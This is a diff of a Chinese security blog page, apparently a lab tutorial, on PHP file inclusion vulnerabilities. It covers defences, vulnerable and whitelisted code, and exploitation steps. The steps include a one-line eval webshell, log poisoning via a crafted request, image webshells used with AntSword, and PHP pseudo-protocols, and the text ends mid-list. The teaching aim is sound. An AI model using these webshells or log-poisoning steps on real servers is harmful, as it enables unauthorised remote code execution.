@@ -1,555 +1,472 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="云逸'bolg" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="云逸'bolg" type="application/atom+xml"><link rel="alternate" type="application/json" title="云逸'bolg" href="http://example.com/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/><link rel="dns-prefetch" href="https://unpkg.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.3.6"><script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.js"></script><link rel="canonical" href="http://example.com/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><title>文件包含漏洞</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">文件包含漏洞</h1><div class="meta"><span class="item" title="创建时间：2023-10-30 22:15:36"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2023-10-30T22:15:36+08:00">2023-10-30</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>11k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>10 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">云逸'bolg</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/bbb.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/oo.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/hg.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzeroselective-coloring-black-background-dark-background-anime-girls-simple-background-2223646-wallhere.com.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/9998.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/8888.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/network-security/" itemprop="item" rel="index" title="分类于网络安全"><span itemprop="name">网络安全<meta itemprop="position" content="0"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/network-security/web-security/" itemprop="item" rel="index" title="分类于web安全"><span itemprop="name">web安全<meta itemprop="position" content="1"/></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/network-security/web-security/Basic-vulnerabilities/" itemprop="item" rel="index" title="分类于基础漏洞"><span itemprop="name">基础漏洞<meta itemprop="position" content="2"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="云逸"/><meta itemprop="description" content=", "/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="云逸'bolg"/></span><div class="body md" itemprop="articleBody"><p><strong>文件包含漏洞（File Inclusion Vulnerability）是一种常见的网络安全漏洞，通常发生在 web 应用程序中。这种漏洞允许攻击者在应用程序中包含、执行或显示本不应该被访问的文件内容。文件包含漏洞通常发生在以下两种情况中：</strong></p>
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="云逸'bolg" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="云逸'bolg" type="application/atom+xml"><link rel="alternate" type="application/json" title="云逸'bolg" href="http://example.com/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/><link rel="dns-prefetch" href="https://unpkg.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.3.6"><script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.js"></script><link rel="canonical" href="http://example.com/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><title>文件包含漏洞</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">文件包含漏洞</h1><div class="meta"><span class="item" title="创建时间：2023-10-30 22:15:36"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2023-10-30T22:15:36+08:00">2023-10-30</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>9.8k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>9 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">云逸'bolg</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/00.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzeroJapanese-Art-monochrome-Japan-samurai-2250916-wallhere.com.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/kkk.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/8888.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/33.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/99.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/network-security/" itemprop="item" rel="index" title="分类于网络安全"><span itemprop="name">网络安全<meta itemprop="position" content="0"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/network-security/web-security/" itemprop="item" rel="index" title="分类于web安全"><span itemprop="name">web安全<meta itemprop="position" content="1"/></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/network-security/web-security/Basic-vulnerabilities/" itemprop="item" rel="index" title="分类于基础漏洞"><span itemprop="name">基础漏洞<meta itemprop="position" content="2"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="云逸"/><meta itemprop="description" content=", "/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="云逸'bolg"/></span><div class="body md" itemprop="articleBody"><p>文件包含漏洞（File Inclusion Vulnerability）是一种常见的网络安全漏洞，通常发生在 web 应用程序中。这种漏洞允许攻击者在应用程序中包含、执行或显示本不应该被访问的文件内容。文件包含漏洞通常发生在以下两种情况中：</p>
 <ol>
-<li><strong>本地文件包含（Local File Inclusion，LFI）：攻击者通过构造恶意请求，使应用程序包含本地文件系统上的文件，通常是敏感文件。这些文件可以包括密码文件、配置文件、日志文件等，泄露敏感信息或执行恶意代码。攻击者通常通过修改 URL 参数或请求头来实施这种攻击。</strong></li>
-<li><strong>远程文件包含（Remote File Inclusion，RFI）：攻击者利用应用程序允许包含远程文件的漏洞，将恶意代码包含到应用程序中，以执行攻击者控制的代码。通常，攻击者提供一个远程 URL，应用程序会下载并执行其中的内容。</strong></li>
-<li><strong>输入验证和过滤：确保应用程序对用户提供的文件路径或 URL 进行适当的输入验证和过滤，以防止包含恶意文件或路径。</strong></li>
-<li><strong>使用白名单：仅允许应用程序包含已知可信的文件或路径，而不是黑名单，因为黑名单可能不完全，无法覆盖所有潜在的攻击。</strong></li>
-<li><strong>隔离文件系统权限：确保应用程序运行在具有最小权限的帐户上，以减少攻击者获取访问文件系统的机会。</strong></li>
-<li><strong>定期更新和维护应用程序：确保应用程序和相关组件都是最新的，以修复已知的漏洞。</strong></li>
-<li><strong>安全编程实践：开发人员应当采用安全编程实践，避免将用户提供的输入直接用于文件包含操作，尤其是未经适当验证和过滤的输入。</strong></li>
-<li><strong>使用 Web 应用程序防火墙（WAF）：WAF 可以帮助检测和阻止文件包含漏洞等攻击。</strong></li>
+<li>本地文件包含（Local File Inclusion，LFI）：攻击者通过构造恶意请求，使应用程序包含本地文件系统上的文件，通常是敏感文件。这些文件可以包括密码文件、配置文件、日志文件等，泄露敏感信息或执行恶意代码。攻击者通常通过修改 URL 参数或请求头来实施这种攻击。</li>
+<li>远程文件包含（Remote File Inclusion，RFI）：攻击者利用应用程序允许包含远程文件的漏洞，将恶意代码包含到应用程序中，以执行攻击者控制的代码。通常，攻击者提供一个远程 URL，应用程序会下载并执行其中的内容。</li>
+<li>输入验证和过滤：确保应用程序对用户提供的文件路径或 URL 进行适当的输入验证和过滤，以防止包含恶意文件或路径。</li>
+<li>使用白名单：仅允许应用程序包含已知可信的文件或路径，而不是黑名单，因为黑名单可能不完全，无法覆盖所有潜在的攻击。</li>
+<li>隔离文件系统权限：确保应用程序运行在具有最小权限的帐户上，以减少攻击者获取访问文件系统的机会。</li>
+<li>定期更新和维护应用程序：确保应用程序和相关组件都是最新的，以修复已知的漏洞。</li>
+<li>安全编程实践：开发人员应当采用安全编程实践，避免将用户提供的输入直接用于文件包含操作，尤其是未经适当验证和过滤的输入。</li>
+<li>使用 Web 应用程序防火墙（WAF）：WAF 可以帮助检测和阻止文件包含漏洞等攻击。</li>
 </ol>
 <h3 id="常见文件包含函数"><a class="markdownIt-Anchor" href="#常见文件包含函数">#</a> <strong>常见文件包含函数</strong></h3>
 <ul>
-<li><strong>PHP</strong>**：**</li>
-<li><strong>include ()****: 用于将文件包含到 PHP 脚本中。如果包含的文件不存在，它会产生警告，但脚本会继续执行。</strong></li>
-<li>**require()<strong><strong>: 与</strong></strong> include ()**<strong> 类似，但如果包含的文件不存在，它会产生致命错误，停止脚本执行。</strong></li>
-<li><strong>include_once ()****: 用于包含文件，但只包含一次，以防止重复包含。</strong></li>
-<li>**require_once()<strong><strong>: 与</strong></strong> include_once ()**<strong> 类似，但只包含一次，并且如果文件不存在会产生致命错误。</strong></li>
-<li><strong>Python</strong>**：**</li>
-<li><strong>execfile ()****: 用于执行 Python 文件。可以将外部文件的代码动态执行在当前环境中。</strong></li>
-<li><strong>import: 用于导入其他 Python 模块。这通常更安全，因为 Python 的导入系统有内置的安全性。</strong></li>
+<li>PHP：</li>
+<li>include (): 用于将文件包含到 PHP 脚本中。如果包含的文件不存在，它会产生警告，但脚本会继续执行。</li>
+<li>require (): 与 include () 类似，但如果包含的文件不存在，它会产生致命错误，停止脚本执行。</li>
+<li>include_once (): 用于包含文件，但只包含一次，以防止重复包含。</li>
+<li>require_once (): 与 include_once () 类似，但只包含一次，并且如果文件不存在会产生致命错误。</li>
+<li>Python：</li>
+<li>execfile (): 用于执行 Python 文件。可以将外部文件的代码动态执行在当前环境中。</li>
+<li>import: 用于导入其他 Python 模块。这通常更安全，因为 Python 的导入系统有内置的安全性。</li>
 </ul>
 <h3 id="代码分析"><a class="markdownIt-Anchor" href="#代码分析">#</a> 代码分析</h3>
 <figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"include/<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span class="token comment">// 变量传进来直接包含，没做任何的安全限制</span></pre></td></tr></table></figure><ul>
-<li><strong>因为它未正确过滤和验证来自客户端的输入数据，而是直接使用了 include 函数包含了客户端传递的文件。所以导致漏洞</strong></li>
-</ul>
-<p><strong>安全写法</strong></p>
-<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>安全的写法<span class="token punctuation">,</span>使用白名单，严格指定包含的文件名</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">==</span><span class="token string single-quoted-string">'file1.php'</span> <span class="token operator">||</span> <span class="token variable">$filename</span><span class="token operator">==</span><span class="token string single-quoted-string">'file2.php'</span> <span class="token operator">||</span> <span class="token variable">$filename</span><span class="token operator">==</span><span class="token string single-quoted-string">'file3.php'</span> <span class="token operator">||</span> <span class="token variable">$filename</span><span class="token operator">==</span><span class="token string single-quoted-string">'file4.php'</span> <span class="token operator">||</span> <span class="token variable">$filename</span><span class="token operator">==</span><span class="token string single-quoted-string">'file5.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"include/<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h3 id="文件包含漏洞利用"><a class="markdownIt-Anchor" href="#文件包含漏洞利用">#</a> 文件包含漏洞利用</h3>
-<ul>
 <li>
-<p><strong>本地文件包含 - 包含本地的文件</strong></p>
+<p>本地文件包含 - 包含本地的文件</p>
 </li>
 <li>
-<p><strong>本地有一个 shell 文件内容是<?php phpinfo();eval($_POST['cmd']);?></strong></p>
+<p>本地有一个 shell 文件内容是 &lt;?php phpinfo ();eval ($_POST [‘cmd’]);&gt;</p>
+</li>
+<li>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/image.png" alt=""></p>
 </li>
 <li>
-<p><strong>传入参数去包含 shell,…/ 是表示上目录，查找有没有这个文件如果有的话就包含这个文件执行里面的</strong></p>
+<p>传入参数去包含 shell,…/ 是表示上目录，查找有没有这个文件如果有的话就包含这个文件执行里面的</p>
 </li>
 <li>
-<p><strong>php 代码如果是不可执行的话返回内容</strong></p>
+<p>php 代码如果是不可执行的话返回内容</p>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2.png" alt=""></p>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/3.png" alt=""></p>
 <ul>
-<li><strong>配合图片马使用也是可以包含执行的</strong></li>
-<li><strong>上传图片马然后用蚂蚁剑连接</strong></li>
+<li>配合图片马使用也是可以包含执行的</li>
+<li>上传图片马然后用蚂蚁剑连</li>
 </ul>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/4.png" alt=""></p>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/5.png" alt=""></p>
 </li>
 </ul>
-<h3 id="包含日志文件进行getshell"><a class="markdownIt-Anchor" href="#包含日志文件进行getshell">#</a> <strong>包含日志文件进行 getshell</strong></h3>
-<p><strong>常见的中间件和服务器日志文件的默认路径可以因软件版本、操作系统和配置而异，但通常以下是一些常见的默认日志文件路径：</strong></p>
+<h3 id="包含日志文件进行getshell"><a class="markdownIt-Anchor" href="#包含日志文件进行getshell">#</a> 包含日志文件进行 getshell</h3>
+<p>常见的中间件和服务器日志文件的默认路径可以因软件版本、操作系统和配置而异，但通常以下是一些常见的默认日志文件路径：</p>
 <ol>
-<li><strong>Apache HTTP Server</strong>**😗*</li>
+<li>Apache HTTP Server:</li>
 </ol>
 <ul>
 <li>
-<ul>
-<li><strong>错误日志文件:</strong> <strong>/var/log/apache2/error.log</strong> <strong>(Debian/Ubuntu) 或</strong> <strong>/var/log/httpd/error_log</strong> <strong>(CentOS/RHEL)</strong></li>
-<li><strong>访问日志文件:</strong> <strong>/var/log/apache2/access.log</strong> <strong>(Debian/Ubuntu) 或</strong> <strong>/var/log/httpd/access_log</strong> <strong>(CentOS/RHEL)</strong></li>
-</ul>
+<p>错误日志文件: /var/log/apache2/error.log (Debian/Ubuntu) 或 /var/log/httpd/error_log (CentOS/RHEL)</p>
+<p>访问日志文件: /var/log/apache2/access.log (Debian/Ubuntu) 或 /var/log/httpd/access_log (CentOS/RHEL)</p>
 </li>
 </ul>
 <ol>
-<li><strong>Nginx</strong>**😗*</li>
+<li>
+<p>Nginx:</p>
+</li>
+<li>
+<p>错误日志文件: /var/log/nginx/error.log</p>
+</li>
+<li>
+<p>访问日志文件: /var/log/nginx/access.log</p>
+</li>
+<li>
+<p>Tomcat:</p>
+</li>
 </ol>
 <ul>
 <li>
-<ul>
-<li><strong>错误日志文件:</strong> <strong>/var/log/nginx/error.log</strong></li>
-<li><strong>访问日志文件: /var/log/nginx/access.log</strong></li>
-</ul>
+<p>错误日志文件:$CATALINA_BASE/logs/catalina.out（通常在 catalina.out 或 catalina.log 文件中）</p>
+<p>访问日志文件: $CATALINA_BASE/logs/access_log</p>
 </li>
 </ul>
 <ol>
-<li><strong>Tomcat</strong>**😗*</li>
+<li>错误日志：</li>
 </ol>
 <ul>
-<li>
-<ul>
-<li><strong>错误日志文件:</strong> <strong>$CATALINA_BASE/logs/catalina.out</strong>**（通常在<strong><strong> catalina.out</strong></strong> 或<strong><strong> catalina.log</strong></strong> 文件中）**</li>
-<li><strong>访问日志文件: $CATALINA_BASE/logs/access_log</strong></li>
-</ul>
-</li>
+<li>默认情况下，IIS 的错误日志通常位于 % SystemDrive%\inetpub\logs\LogFiles\W3SVC#\ 目录中，其中 ** <strong>#</strong> ** 代表站点的唯一 ID。通常，这个目录中会有多个子目录，每个子目录对应一个不同的站点。</li>
 </ul>
 <ol>
-<li><strong>错误日志：</strong></li>
+<li>访问日志：</li>
 </ol>
 <ul>
-<li>
-<ul>
-<li><strong>默认情况下，IIS 的错误日志通常位于</strong> *<em>%SystemDrive%\inetpub\logs\LogFiles\W3SVC#*</em> <strong>目录中，其中</strong> <strong>#</strong> <strong>代表站点的唯一 ID。通常，这个目录中会有多个子目录，每个子目录对应一个不同的站点。</strong></li>
-</ul>
-</li>
+<li>访问日志通常也存储在与错误日志相同的目录中，即 % SystemDrive%\inetpub\logs\LogFiles\W3SVC#。这里的 # 仍然代表站点的唯一 ID。通常，访问日志文件以 u_exYYMMDD.log 格式的方式命名，其中 YYMMDD 代表日期。</li>
 </ul>
 <ol>
-<li><strong>访问日志</strong> **：**</li>
-</ol>
-<ul>
-<li>
-<ul>
-<li><strong>访问日志通常也存储在与错误日志相同的目录中，即 % SystemDrive%\inetpub\logs\LogFiles\W3SVC#。这里的 # 仍然代表站点的唯一 ID。通常，访问日志文件以 u_exYYMMDD.log 格式的方式命名，其中 YYMMDD 代表日期。</strong></li>
-</ul>
-</li>
-</ul>
-<ol>
-<li><strong>用 burp 抓包然后把提交的参数写成一句话木马<?php phpinfo();eval($_POST['cmd']);?></strong></li>
-<li><strong>然后 apache 服务器日志里会有这样的记录 127.0.0.1 - - [30/Oct/2023:17:51:19 +0800] “GET /vul/fileinclude/fi_local.php?filename=<?php phpinfo();eval($_POST['cmd']);?>&amp;submit=% E6%8F%90% E4% BA% A4% E6%9F% A5% E8% AF% A2” 400 2220 里会有我们刚才提交的一句话木马，然后用文件包含去包含</strong></li>
-<li><strong>这个日志文件里面的一句话就会被执行错误日志也可以（前提是要有权限）</strong></li>
+<li>用 burp 抓包然后把提交的参数写成一句话木马<?php phpinfo();eval($_POST['cmd']);?></li>
+<li>然后 apache 服务器日志里会有这样的记录 127.0.0.1 - - [30/Oct/2023:17:51:19 +0800] “GET /vul/fileinclude/fi_local.php?filename=<?php phpinfo();eval($_POST['cmd']);?>&amp;submit=% E6%8F%90% E4% BA% A4% E6%9F% A5% E8% AF% A2” 400 2220 里会有我们刚才提交的一句话木马，然后用文件包含去包含</li>
+<li>这个日志文件里面的一句话就会被执行错误日志也可以（前提是要有权限）</li>
 </ol>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/6.png" alt=""></p>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/7.png" alt=""></p>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/8.png" alt=""></p>
 <h3 id="配合文件上传漏洞getshell"><a class="markdownIt-Anchor" href="#配合文件上传漏洞getshell">#</a> 配合文件上传漏洞 getshell</h3>
-<p><strong>文件上传一个 txt 文本或者图片里面添加一句话木马</strong></p>
+<p>文件上传一个 txt 文本或者图片里面添加一句话木马</p>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/9.png" alt=""></p>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/10.png" alt=""></p>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/11.png" alt=""></p>
 <h3 id="伪协议"><a class="markdownIt-Anchor" href="#伪协议">#</a> 伪协议</h3>
 <ol>
-<li><strong>file://:</strong></li>
+<li>file://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于访问本地文件系统中的文件。在文件包含漏洞攻击中，攻击者可能尝试使用这个协议来包含恶意文件。</strong></li>
+<li>用于访问本地文件系统中的文件。在文件包含漏洞攻击中，攻击者可能尝试使用这个协议来包含恶意文件。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>http://</strong> <strong>和</strong> <strong>https://****:</strong></li>
+<li>http:// 和 https://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于访问 HTTP 和 HTTPS URL 资源。这些协议通常用于从 Web 服务器上获取数据。</strong></li>
+<li>用于访问 HTTP 和 HTTPS URL 资源。这些协议通常用于从 Web 服务器上获取数据。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>ftp://</strong> <strong>和</strong> <strong>ftps://****:</strong></li>
+<li>ftp:// 和 ftps://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于访问 FTP 和 FTPS URLs，可以用于上传和下载文件。</strong></li>
+<li>用于访问 FTP 和 FTPS URLs，可以用于上传和下载文件。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>php://****:</strong></li>
+<li>php://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于访问各种输入 / 输出流，如<strong><strong> php://input</strong></strong> 和<strong><strong> php://output</strong></strong>，在 PHP 中执行文件操作时非常有用。</strong></li>
+<li>用于访问各种输入 / 输出流，如 php://input 和 php://output，在 PHP 中执行文件操作时非常有用。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>zlib://****:</strong></li>
+<li>zlib://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于压缩和解压缩流。</strong></li>
+<li>用于压缩和解压缩流。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>data://****:</strong></li>
+<li>data://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于处理数据 URL，允许将数据直接嵌入到 URL 中。</strong></li>
+<li>用于处理数据 URL，允许将数据直接嵌入到 URL 中。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>glob://****:</strong></li>
+<li>glob://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于查找匹配的文件路径模式，通常用于文件操作。</strong></li>
+<li>用于查找匹配的文件路径模式，通常用于文件操作。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>phar://****:</strong></li>
